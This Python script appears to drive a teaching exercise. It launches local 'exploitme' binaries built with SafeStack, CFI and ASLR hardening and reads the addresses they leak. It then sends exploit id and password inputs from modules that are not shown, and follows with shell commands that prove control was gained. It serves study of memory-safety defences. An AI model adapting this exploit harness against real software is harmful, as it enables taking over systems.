#!/usr/bin/env python3

import argparse
import sys
import tty
import pexpect
import default_exploit
import safestack_exploit
import cfi_exploit
import aslr_exploit

parser = argparse.ArgumentParser()
parser.add_argument('--target', type=str, choices=("exploitme", "exploitme-safestack", "exploitme-safestack-cfi", "exploitme-safestack-cfi-aslr"), required=True)
args = parser.parse_args()
target = args.target

if target == "exploitme":
    exploit = default_exploit
elif target == "exploitme-safestack":
    exploit = safestack_exploit
elif target == "exploitme-safestack-cfi":
    exploit = cfi_exploit
elif target == "exploitme-safestack-cfi-aslr":
    exploit = aslr_exploit
else:
    sys.exit(-1)

p = pexpect.spawn("./{}".format(target))
p.logfile = sys.stdout.buffer
tty.setraw(p.child_fd)

p.expect(r'(0x[0-9a-f]+)')
func_addr = int(p.match.group(1), 16)

p.expect(r'(0x[0-9a-f]+)')
funcptr_addr = int(p.match.group(1), 16)

p.expect("Enter id:")
id = exploit.get_id(func_addr, funcptr_addr)
p.sendline(id)

p.expect("Enter password:")
password = exploit.get_password(func_addr, funcptr_addr)
p.sendline(password)

# Send shell commands.
p.sendline("ls /")
p.sendline("touch {}.exploited".format(target))
p.sendline("exit")

p.expect(pexpect.EOF)
p.close()
